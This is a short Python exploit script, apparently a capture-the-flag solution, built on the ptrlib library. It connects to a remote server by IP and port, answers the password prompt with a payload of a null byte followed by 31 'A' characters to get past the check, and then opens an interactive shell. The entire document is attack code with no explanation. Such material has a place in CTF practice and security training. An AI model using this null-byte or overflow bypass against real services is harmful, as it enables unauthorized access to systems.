from ptrlib import *

io = Socket("nc 34.170.146.252 14237")

# ペイロード作成
payload = b"\x00" + b"A" * 31

io.sendlineafter("Password: ", payload)
io.sh()
